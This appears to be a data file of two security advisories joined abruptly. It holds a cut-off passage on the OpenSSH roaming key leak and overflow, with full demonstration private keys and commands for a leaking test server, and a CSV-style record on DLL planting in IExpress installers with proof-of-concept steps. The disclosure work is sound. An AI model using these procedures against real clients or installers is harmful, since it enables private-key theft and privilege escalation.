MIIBvQIBAAKBgQDmjJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5n
GLnZn1lmDldNaqhV0ECESXZVEpq/8TR2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsCioD2
hUaU7sV6Nho9fJIclxuxZP8j+uzidQKKN/+CVbQougsLsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4=
-----END DSA PRIVATE KEY-----
# env ROAMING=""heap_massaging:linux"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
...
# strings /tmp/roaming-b7b16dfc/infoleak
jJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5
# strings /tmp/roaming-b324ce87/infoleak
IuQL
R2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9v
# strings /tmp/roaming-24011739/infoleak
KjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsC
# strings /tmp/roaming-37456846/infoleak
LsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZNA
yq4Kwj/
# strings /tmp/roaming-988ff54c/infoleak
GBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/
# strings /tmp/roaming-53887fa5/infoleak
/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4
------------------------------------------------------------------------
Private Key Disclosure example: Fedora 20, 2048-bit RSA key
------------------------------------------------------------------------
$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME=""Fedora 20 (Heisenbug)""
$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013
$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmbj/XjOppLWSAhuLKiRoHsdp66LJdY2PvP0ht3GWDKKCk7Gz
HLas5VjotS9rmupavGGDiicMHPClOttWAI9MRyvP77iZhSei/RzX1/UKk/broTDp
o9ljBnQTzRAyw8ke72Ih77SOGfOLBvYlx80ZmESLYYH95aAeuuDvb236JnsgRPDQ
/B/gyRIhfqis70USi05/ZbnAenFn+v9zoSduDYMzSM8mFmh9f+9PVb9qMHdfNkIy
2E78kt9BknU/bEcCWyL+IXNLV0rgRGAcE0ncKu13YvuH/7o4Q7bW2FYErT4P/FHK
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9w9gf1zGqWkTytMiqcawMW4LZAJlSI/rGWe7lYHuceZSSgzd5lF4VP06
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+prtAxpPNfKElEV7ZPBrTRAuCUr
Hiy7yflZ3w0qHekNafX/tnWiU4zi/p6aD4rs10YaYSnSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa
jwj3EZsXmtP+wd3fhge7pIHp5RiKfBn0JtSvXQQHO0k0eEcQ4aA/6yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4syLfm
qK+cwb7uCSi5PfloRiLryPdvnobDGLfFGdOHaX7km+4u5+taYg2Er8IsAxtMNwM5
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+
ZS16+aH97RKdJD/4qiskzzHvZs+wi4LKPHHHz7ETXr/m4CRfMIU=
-----END RSA PRIVATE KEY-----
# env ROAMING=""heap_massaging:linux"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
...
# strings /tmp/roaming-a2bbc5f6/infoleak
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CG
# strings /tmp/roaming-47b46456/infoleak
RGAcE0nc
GCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9
# strings /tmp/roaming-7a6717ae/infoleak
cawMW4LZ1
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+p
# strings /tmp/roaming-f3091f08/infoleak
lZ3w0qHe
nSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ
# strings /tmp/roaming-62a9e9a3/infoleak
lZ3w0qHe
r3TwTa0pPEk11
LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37P
# strings /tmp/roaming-8de31ed5/infoleak
7qyvNznQ
26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa
# strings /tmp/roaming-f5e0fbcc/infoleak
yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxS
# strings /tmp/roaming-9be933df/infoleak
QRtzK/GpRuMC1
C3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmT
# strings /tmp/roaming-ee4d1e6c/infoleak
SG3aTqYp
tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//s
# strings /tmp/roaming-c2bfd69c/infoleak
SG3aTqYp
6JmTOun5zVV6A
H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4s
# strings /tmp/roaming-2b3217a1/infoleak
DGLfFGdO
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCQ
# strings /tmp/roaming-1e275747/infoleak
g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+
========================================================================
Buffer Overflow (CVE-2016-0778)
========================================================================
------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------
Support for roaming was elegantly added to the OpenSSH client: the calls
to read() and write() that communicate with the SSH server were replaced
by calls to roaming_read() and roaming_write(), two wrappers that depend
on wait_for_roaming_reconnect() to transparently reconnect to the server
after a disconnection. The wait_for_roaming_reconnect() routine is
essentially a sequence of four subroutines:
239 int
240 wait_for_roaming_reconnect(void)
241 {
...
250 fprintf(stderr, ""[connection suspended, press return to resume]"");
...
252 packet_backup_state();
253 /* TODO Perhaps we should read from tty here */
254 while ((c = fgetc(stdin)) != EOF) {
...
259 if (c != ' ' && c != ' ')
260 continue;
261
262 if (ssh_connect(host, &hostaddr, options.port,
...
265 options.proxy_command) == 0 && roaming_resume() == 0) {
266 packet_restore_state();
...
268 fprintf(stderr, ""[connection resumed] "");
...
270 return 0;
271 }
272
273 fprintf(stderr, ""[reconnect failed, press return to retry]"");
...
275 }
276 fprintf(stderr, ""[exiting] "");
...
278 exit(0);
279 }
1. packet_backup_state() close()s connection_in and connection_out (the
old file descriptors that connected the client to the server), and saves
the state of the suspended SSH session (for example, the encryption and
decryption contexts).
2. ssh_connect() opens new file descriptors, and connects them to the
SSH server.
3. roaming_resume() negotiates the resumption of the suspended SSH
session with the server, and calls resend_bytes().
4. packet_restore_state() updates connection_in and connection_out (with
the new file descriptors that connect the client to the server), and
restores the state of the suspended SSH session.
The new file descriptors for connection_in and connection_out may differ
from the old ones (if, for example, files or pipes or sockets are opened
or closed between two successive ssh_connect() calls), but unfortunately
historical code in OpenSSH assumes that they are constant:
- In client_loop(), the variables connection_in and connection_out are
cached locally, but packet_write_poll() calls roaming_write(), which
may assign new values to connection_in and connection_out (if a
reconnection occurs), and client_wait_until_can_do_something()
subsequently reuses the old, cached values.
- client_loop() eventually updates these cached values, and the
following FD_ISSET() uses a new, updated file descriptor (the fd
connection_out), but an old, out-of-date file descriptor set (the
fd_set writeset).
- packet_read_seqnr() (old API, or ssh_packet_read_seqnr(), new API)
first calloc()ates setp, a file descriptor set for connection_in;
next, it loops around memset(), FD_SET(), select() and roaming_read();
last, it free()s setp and returns. Unfortunately, roaming_read() may
reassign a higher value to connection_in (if a reconnection occurs),
but setp is never enlarged, and the following memset() and FD_SET()
may therefore overflow setp (a heap-based buffer overflow):
1048 int
1049 packet_read_seqnr(u_int32_t *seqnr_p)
1050 {
....
1052 fd_set *setp;
....
1058 setp = (fd_set *)xcalloc(howmany(active_state->connection_in + 1,
1059 NFDBITS), sizeof(fd_mask));
....
1065 for (;;) {
....
1075 if (type != SSH_MSG_NONE) {
1076 free(setp);
1077 return type;
1078 }
....
1083 memset(setp, 0, howmany(active_state->connection_in + 1,
1084 NFDBITS) * sizeof(fd_mask));
1085 FD_SET(active_state->connection_in, setp);
....
1092 for (;;) {
....
1097 if ((ret = select(active_state->connection_in + 1, setp,
1098 NULL, NULL, timeoutp)) >= 0)
1099 break;
....
1115 }
....
1117 do {
....
1119 len = roaming_read(active_state->connection_in, buf,
1120 sizeof(buf), &cont);
1121 } while (len == 0 && cont);
....
1130 }
1131 /* NOTREACHED */
1132 }
- packet_write_wait() (old API, or ssh_packet_write_wait(), new API) is
basically similar to packet_read_seqnr() and may overflow its own setp
if roaming_write() (called by packet_write_poll()) reassigns a higher
value to connection_out (after a successful reconnection):
1739 void
1740 packet_write_wait(void)
1741 {
1742 fd_set *setp;
....
1746 setp = (fd_set *)xcalloc(howmany(active_state->connection_out + 1,
1747 NFDBITS), sizeof(fd_mask));
1748 packet_write_poll();
1749 while (packet_have_data_to_write()) {
1750 memset(setp, 0, howmany(active_state->connection_out + 1,
1751 NFDBITS) * sizeof(fd_mask));
1752 FD_SET(active_state->connection_out, setp);
....
1758 for (;;) {
....
1763 if ((ret = select(active_state->connection_out + 1,
1764 NULL, setp, NULL, timeoutp)) >= 0)
1765 break;
....
1776 }
....
1782 packet_write_poll();
1783 }
1784 free(setp);
1785 }
------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------
This buffer overflow affects all OpenSSH clients >= 5.4, but its impact
is significantly reduced by the Mitigating Factors detailed in the
Information Leak section, and additionally:
- OpenSSH versions >= 6.8 reimplement packet_backup_state() and
packet_restore_state(), but introduce a bug that prevents the buffer
overflow from being exploited; indeed, ssh_packet_backup_state() swaps
two local pointers, ssh and backup_state, instead of swapping the two
global pointers active_state and backup_state:
9 struct ssh *active_state, *backup_state;
...
238 void
239 packet_backup_state(void)
240 {
241 ssh_packet_backup_state(active_state, backup_state);
242 }
243
244 void
245 packet_restore_state(void)
246 {
247 ssh_packet_restore_state(active_state, backup_state);
248 }
2269 void
2270 ssh_packet_backup_state(struct ssh *ssh,
2271 struct ssh *backup_state)
2272 {
2273 struct ssh *tmp;
....
2279 if (backup_state)
2280 tmp = backup_state;
2281 else
2282 tmp = ssh_alloc_session_state();
2283 backup_state = ssh;
2284 ssh = tmp;
2285 }
....
2291 void
2292 ssh_packet_restore_state(struct ssh *ssh,
2293 struct ssh *backup_state)
2294 {
2295 struct ssh *tmp;
....
2299 tmp = backup_state;
2300 backup_state = ssh;
2301 ssh = tmp;
2302 ssh->state->connection_in = backup_state->state->connection_in;
As a result, the global pointer backup_state is still NULL when passed
to ssh_packet_restore_state(), and crashes the OpenSSH client when
dereferenced:
# env ROAMING=""overflow:A fd_leaks:0"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1
$ /usr/bin/ssh -o ProxyCommand=""/usr/bin/nc -w 15 %h %p"" -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume]Segmentation fault (core dumped)
This bug prevents the buffer overflow from being exploited, but not
the information leak, because the vulnerable function resend_bytes()
is called before ssh_packet_restore_state() crashes.
- To the best of our knowledge, this buffer overflow is not exploitable
in the default configuration of the OpenSSH client; the conclusion of
the File Descriptor Leak section suggests that two non-default options
are required: a ProxyCommand, and either ForwardAgent (-A) or
ForwardX11 (-X).
------------------------------------------------------------------------
File Descriptor Leak
------------------------------------------------------------------------
A back-of-the-envelope calculation indicates that, in order to increase
the file descriptor connection_in or connection_out, and thus overflow
the file descriptor set setp in packet_read_seqnr() or
packet_write_wait(), a file descriptor leak is needed:
- First, the number of bytes calloc()ated for setp is rounded up to the
nearest multiple of sizeof(fd_mask): 8 bytes (or 64 file descriptors)
on 64-bit systems.
- Next, in glibc, this number is rounded up to the nearest multiple of
MALLOC_ALIGNMENT: 16 bytes (or 128 file descriptors) on 64-bit
systems.
- Last, in glibc, a MIN_CHUNK_SIZE is enforced: 32 bytes on 64-bit
systems, of which 24 bytes (or 192 file descriptors) are reserved for
setp.
- In conclusion, a file descriptor leak is needed, because connection_in
or connection_out has to be increased by hundreds in order to overflow
setp.
The search for a suitable file descriptor leak begins with a study of
the behavior of the four ssh_connect() methods, when called for a
reconnection by wait_for_roaming_reconnect():
1. The default method ssh_connect_direct() communicates with the server
through a simple TCP socket: the two file descriptors connection_in and
connection_out are both equal to this socket's file descriptor.
In wait_for_roaming_reconnect(), the low-numbered file descriptor of the
old TCP socket is close()d by packet_backup_state(), but immediately
reused for the new TCP socket in ssh_connect_direct(): the new file
descriptors connection_in and connection_out are equal to this old,
low-numbered file descriptor, and cannot possibly overflow setp.
2. The special ProxyCommand ""-"" communicates with the server through
stdin and stdout, but (as explained in the Mitigating Factors of the
Information Leak section) it cannot possibly reconnect to the server,
and is therefore immune to this buffer overflow.
3. Surprisingly, we discovered a file descriptor leak in the
ssh_proxy_fdpass_connect() method itself; indeed, the file descriptor
sp[1] is never close()d:
101 static int
102 ssh_proxy_fdpass_connect(const char *host, u_short port,
103 const char *proxy_command)
104 {
...
106 int sp[2], sock;
...
113 if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) < 0)
114 fatal(""Could not create socketpair to communicate with ""
115 ""proxy dialer: %.100s"", strerror(errno));
...
161 close(sp[0]);
...
164 if ((sock = mm_receive_fd(sp[1])) == -1)
165 fatal(""proxy dialer did not pass back a connection"");
...
171 /* Set the connection file descriptors. */
172 packet_set_connection(sock, sock);
173
174 return 0;
175 }
However, two different reasons prevent this file descriptor leak from
triggering the setp overflow:
- The method ssh_proxy_fdpass_connect() communicates with the server
through a single socket received from the ProxyCommand: the two file
descriptors connection_in and connection_out are both equal to this
socket's file descriptor.
In wait_for_roaming_reconnect(), the low-numbered file descriptor of
the old socket is close()d by packet_backup_state(), reused for sp[0]
in ssh_proxy_fdpass_connect(), close()d again, and eventually reused
again for the new socket: the new file descriptors connection_in and
connection_out are equal to this old, low-numbered file descriptor,
and cannot possibly overflow setp.
- Because of the waitpid() bug described in the Mitigating Factors of
the Information Leak section, the method ssh_proxy_fdpass_connect()
calls fatal() before it returns to wait_for_roaming_reconnect(), and
is therefore immune to this buffer overflow.
4. The method ssh_proxy_connect() communicates with the server through a
ProxyCommand and two different pipes: the file descriptor connection_in
is the read end of the second pipe (pout[0]), and the file descriptor
connection_out is the write end of the first pipe (pin[1]):
180 static int
181 ssh_proxy_connect(const char *host, u_short port, const char *proxy_command)
182 {
...
184 int pin[2], pout[2];
...
192 if (pipe(pin) < 0 || pipe(pout) < 0)
193 fatal(""Could not create pipes to communicate with the proxy: %.100s"",
194 strerror(errno));
...
240 /* Close child side of the descriptors. */
241 close(pin[0]);
242 close(pout[1]);
...
247 /* Set the connection file descriptors. */
248 packet_set_connection(pout[0], pin[1]);
249
250 /* Indicate OK return */
251 return 0;
252 }
In wait_for_roaming_reconnect(), the two old, low-numbered file
descriptors connection_in and connection_out are both close()d by
packet_backup_state(), and immediately reused for the pipe(pin) in
ssh_proxy_connect(): the new connection_out (pin[1]) is equal to one of
these old, low-numbered file descriptors, and cannot possibly overflow
setp.
On the other hand, the pipe(pout) in ssh_proxy_connect() may return
high-numbered file descriptors, and the new connection_in (pout[0]) may
therefore overflow setp, if hundreds of file descriptors were leaked
before the call to wait_for_roaming_reconnect():
- We discovered a file descriptor leak in the pubkey_prepare() function
of OpenSSH >= 6.8; indeed, if the client is running an authentication
agent that does not offer any private keys, the reference to agent_fd
is lost, and this file descriptor is never close()d:
1194 static void
1195 pubkey_prepare(Authctxt *authctxt)
1196 {
....
1200 int agent_fd, i, r, found;
....
1247 if ((r = ssh_get_authentication_socket(&agent_fd)) != 0) {
1248 if"
3695,"[CVE-2016-0014] Executable installers are vulnerable^WEVIL (case 1): Microsoft's IExpress resp. WExtract, SFXCab, BoxStub, ...",,CVE-2016-0014,"Hi @ll,
IExpress (<https://msdn.microsoft.com/en-us/library/dd346760.aspx>)
creates executable installers [ï¿½] or self-extracting archives for
Windows by embedding a .CAB archive and some strings as resources
into a copy of the program %SystemRoot%System32WExtract.exe.
These self-extracting archives/executable installers, especially
those made by Microsoft ['] (available in the Microsoft download
center or distributed per Windows Update), are vulnerable:
1. If built with WExtract.exe of a system supporting the NTFS
""encrypting file system"", i.e. Windows NT5.x, Windows NT6.x or
Windows 10, and run under these versions of Windows, they load
and execute a rogue/bogus/malicious FEClient.dll [ï¿½] eventually
found in the directory they are started from (the ""application
directory"").
For software downloaded with a web browser this is typically the
""Downloads"" directory: see
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html>
and <http://seclists.org/fulldisclosure/2012/Aug/134>
If FEClient.dll gets planted in the ""Downloads"" directory per
""drive-by download"" this vulnerability becomes a remote code
execution.
Due to an application manifest embedded in the executable which
specifies ""requireAdministrator"" or the ""installer detection"" (see
<https://technet.microsoft.com/en-us/library/dd835540.aspx#BKMK_InstDet>)
of Windows' ""user account control"" executable installers are
typically started with administrative privileges (""protected""
administrators are prompted for consent, unprivileged standard
users are prompted for an administrator password); execution of
FEClient.dll then results in an escalation of privilege!
2. They call CreateProcess() with command line(s) set during package
creation.
These command lines have to be specified with unqualified (simple)
filenames since the absolute pathnames on the target system are
unknown. Due to CreateProcess() process search order they will run
rogue executables with the specified simple filename(s) eventually
found in the directory they are started from.
See <http://seclists.org/fulldisclosure/2013/Oct/5>.
DON'T USE <https://msdn.microsoft.com/en-us/library/ff553615.aspx>
(especially step 8. which uses simple filenames in the command
line)!
DON'T USE <https://msdn.microsoft.com/en-us/library/dd293575.aspx>
(especially step 3.h. which uses simple filenames in the command
line)!
3. They extract their payload to an unsafe temporary (sub)directory
""%TEMP%IXP<3_digits>.TMP"" and process or execute it from there [ï¿½].
The files comprising the payload can be overwritten or compromised
by an unprivileged user after extraction and before their later use.
4. Executable (un)installers distributed per software deployment system
(for example WSUS) or wrapped into a .MSI for deployment per group
policies are (typically) run under ""LocalSystem"" account.
From <https://technet.microsoft.com/en-us/library/dn265983.aspx>:
| The list of trusted root certificates is available as a self-
| extracting IEXPRESS package in the Microsoft Download Center, the
| Windows catalog, or by using Windows Server Update Services (WSUS).
...
| The list of untrusted certificates comes as a self-extracting
| IEXPRESS package in a mandatory security Windows Update.
Processes running under ""LocalSystem"" account use the global
%TEMP% directory %SystemRoot%Temp where (unprivileged) users
can create (or overwrite) files and conduct all these attacks.
For a recent example of such a vulnerability see
<https://code.google.com/p/google-security-research/issues/detail?id=440>
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. visit <http://home.arcor.de/skanthak/sentinel.html>, download
<http://home.arcor.de/skanthak/download/SENTINEL.DLL> and save
it as FEClient.dll in your ""Downloads"" directory;
2. download the AntiMalware Definition Updater MPAM-D.EXE or
MPAM-FE[X64].EXE (see <https://support.microsoft.com/en-us/kb/935934>,
<https://technet.microsoft.com/en-us/library/gg398041.aspx> and
<http://www.microsoft.com/security/portal/definitions/adl.aspx>)
and save it in your ""Downloads"" directory;
3. execute MPAM-*.EXE from your ""Downloads"" directory;
4. notice the message box displayed from FEClient.dll placed in step 1.
Instead of MPAM-*.EXE you can use ALMOST ANY other executable installer
available from the Microsoft Download Center or via Windows Update!
Just to pick (pun intended.-) a few:
* Windows-KB890830-v*.exe, the malicious software removal tool,
<http://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx?id=16>
or
<http://www.microsoft.com/en-us/download/malicious-software-removal-tool-details.aspx?id=9905>
* ROOTSUPD-KB931125-*.exe, the root certificate updater, see
<https://support.microsoft.com/kb/931125>
* RVKROOTS.EXE, the root certificate revocation list updater,
available from the SECURITY (sic!) advisories
<https://support.microsoft.com/en-us/kb/2728973>
<https://support.microsoft.com/en-us/kb/2798897>
<https://support.microsoft.com/en-us/kb/2917500>
<https://support.microsoft.com/en-us/kb/2982792>
<httpa://support.microsoft.com/en-us/kb/3046310>
<https://support.microsoft.com/en-us/kb/3050995>
or the Microsoft Update Catalog
<https://catalog.update.microsoft.com/v7/site/ScopedViewInline.aspx?updateid=416de864-839a-4a61-907f-d18cabcc6dda>
* ALL installers of the .NET Framework:
NDP46-KB3045557-x86-x64-AllOS-ENU.exe,
NDP46-KB3045557-x86-x64-AllOS-DEU.exe,
NDP46-KB3045557-x86-x64-AllOS-*.exe,
dotNetFx40_Full_x86_x64.exe,
dotNetFx40_Client_x86_x64.exe,
NDP40-KB2656405-x86.exe,
NDP40-KB2656405-x64.exe,
...,
NDP*.exe,
DotNETFX.Exe,
LangPack.Exe
* Windows Defender Offline, see
<http://windows.microsoft.com/en-US/windows/what-is-windows-defender-offline>
* ALL Visual C++ Runtime 20xy Redistributable Packages
* ALL hotfixes and updates for Windows 2000, Windows XP, Windows
Embedded POSReady 2009, Windows Server 2003 (Windows*-KB*-*.exe)
and THOUSANDS more!
Cause:
~~~~~~
About 16 years ago Microsoft introduced the NTFS ""encrypting file
system"".
<https://technet.microsoft.com/en-us/library/cc781588.aspx>:
| When a user modifies EFS options for a file or folder, or when an
| application attempts to access an encrypted file on an NTFS volume,
| the Win32 application programming interface (API) passes the
| resulting EFS-related calls to the Feclient DLL. Feclient then
| calls the EFS remote procedure call (RPC) interfaces in the LSA.
FEClient.dll is loaded on demand by AdvAPI32.dll (one of the Win32
core components) without its well-known fully qualified pathname,
resulting in the vulnerability now fixed with MS16-007 alias KB3121918.
Mitigation(s):
~~~~~~~~~~~~~~
0. DON'T USE EXECUTABLE INSTALLERS [ï¿½]!
If your favourite applications are not distributed in the native
installer package format of the resp. target platform: ask^WURGE
their vendors/developers to provide native installation packages.
If they don't: dump these applications, stay away from such cruft!
1. Turn off UAC's privilege elevation for standard users and installer
detection for all users:
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem]
""ConsentPromptBehaviorUser""=dword:00000000 ; Automatically deny elevation requests
""EnableInstallerDetection""=dword:00000000
See <https://technet.microsoft.com/en-us/library/dd835564.aspx#BKMK_RegistryKeys>
2. NEVER execute files in UNSAFE directories (like ""Downloads"" and
and ""%TEMP%"")!
3. Deny execution (at least) in the ""Downloads"" directories and all
""%TEMP%"" directories and their subdirectories:
* Add the NTFS ACE ""(D;OIIO;WP;;;WD)"" meaning ""deny execution of
files in this directory for everyone, inheritable to all files
in all subdirectories"" (use CACLS.EXE /S:<SDDL> for example);
* Use ""software restriction policies"" resp. AppLocker.
Consider to apply either/both to every ""%USERPROFILE%"" as well as
""%ALLUSERSPROFILE%"" alias %ProgramData%"" and ""%PUBLIC%"": Windows
doesn't place executables in these directories and beyond.
See <http://home.arcor.de/skanthak/safer.html> as well as
<http://mechbgon.com/srp/> plus
<http://csrc.nist.gov/itsec/SP800-68r1.pdf>,
<https://www.nsa.gov/ia/_files/os/win2k/application_whitelisting_using_srp.pdf>
or <https://books.google.de/books?isbn=1437914926> and finally
<http://www.asd.gov.au/infosec/top35mitigationstrategies.htm>!
stay tuned
Stefan Kanthak
PS: for ""case 0"" see <http://seclists.org/fulldisclosure/2015/Sep/21>,
for ""case 0.5"" see <http://seclists.org/fulldisclosure/2013/Oct/5>;
the case numbers are not in chronological order.
PPS: see <http://seclists.org/fulldisclosure/2015/Nov/101> (resp. the
not yet finished <http://home.arcor.de/skanthak/!execute.html>)
for more details!
[ï¿½] Self-extracting archives and executable installers are flawed^W
b(rainde)ad in concept and dangerous in practice.
DON'T USE SUCH CRUFT!
ALWAYS use the resp. target platforms native package and archive
format.
For Windows these are .INF (plus .CAB) and .MSI (plus .CAB),
introduced 20 years ago (with Windows 95 and Windows NT4) resp.
16 years ago (with Office 2000).
Both .INF and .MSI are ""opened"" by programs residing in
%SystemRoot%System32 which are therefore immune to this kind
of ""DLL and EXE Search Order Hijacking"" attack.
Since both .INF and .MSI access the contents of .CAB directly
they eliminate the attack vector ""unsafe temporary directory""
too.
['] Current IExpress installers created by Microsoft have an
application manifest that specifies ""requireAdministrator"".
For example:
* ROOTSUPD-KB931125-*.exe, the root certificate updater, see
<https://support.microsoft.com/kb/931125>
* RVKROOTS.EXE, the root certificate revocation list updater,
available from the security (SIC!) advisories
<https://support.microsoft.com/en-us/kb/2728973>,
<https://support.microsoft.com/en-us/kb/2798897>,
<https://support.microsoft.com/en-us/kb/2917500>,
<https://support.microsoft.com/en-us/kb/2982792>,
<httpa://support.microsoft.com/en-us/kb/3046310>,
<https://support.microsoft.com/en-us/kb/3050995>
or the Microsoft Update Catalog
<https://catalog.update.microsoft.com/v7/site/ScopedViewInline.aspx?updateid=416de864-839a-4a61-907f-d18cabcc6dda>
Older IExpress installers created by Microsoft have NO
application manifest and are therefore subject to UAC's
installer detection.
For example:
* CAPICOM-KB931906-v2102.exe, a security (SIC!) update available
from <https://support.microsoft.com/en-us/kb/931906>
or <https://technet.microsoft.com/en-us/library/ms07-028.aspx>.
[ï¿½] A well-known (trivial, easy to avoid, easy to detect,
easy to exploit and easy to fix) and well-documented
vulnerability: see
